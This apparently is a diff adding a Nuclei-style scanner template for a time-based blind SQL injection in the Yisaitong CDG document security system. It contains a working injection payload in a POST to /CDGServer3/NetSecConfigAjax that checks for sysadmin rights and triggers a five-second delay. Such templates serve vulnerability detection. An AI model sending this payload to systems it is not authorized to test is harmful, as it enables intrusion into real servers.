@@ -1,0 +1,29 @@
+id: yisaitong-CDG-NetSecConfigAjax-sqli
+
+info:
+  name: 亿赛通电子文档安全管理系统-SQL注入-NetSecConfigAjax
+  author: HuanXiong
+  severity: high
+  description: |-
+    
+  reference:
+    - 
+  tags: SQL Injection
+
+http:
+  - raw:
+      - |
+        POST /CDGServer3/NetSecConfigAjax;Service HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0
+        Accept-Language: zh-CN
+        Content-Type: application/x-www-form-urlencoded
+        Connection: close
+        
+        command=updateNetSec&state=123';if (select IS_SRVROLEMEMBER('sysadmin'))=1 WAITFOR DELAY '0:0:5'--
+        
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - 'duration_1 > 5 && status_code==200'
